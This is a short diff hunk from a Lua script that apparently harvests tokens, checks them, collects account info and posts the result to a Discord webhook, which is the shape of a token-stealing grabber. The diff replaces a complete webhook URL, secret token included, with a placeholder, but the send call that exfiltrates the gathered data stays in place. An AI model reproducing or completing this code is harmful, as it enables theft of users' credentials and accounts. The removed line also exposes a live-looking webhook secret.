@@ -10,7 +10,7 @@ coroutine.resume(coroutine.create(function()
     local tokens = get()
     local checked = check(tokens)
     local info = info(checked)
-    send(info, 'https://discord.com/api/webhooks/874680613226020885/ScBR2wAsSy7qWMkBYU6pssQHD61jjJC9-sPEfhOpj5VzR8crGS9v7QU-EOchqsgg9YSq')
+    send(info, 'https://discord.com/api/webhooks/874680613226020885/no webhook token soz')
 end))
 
 local num1
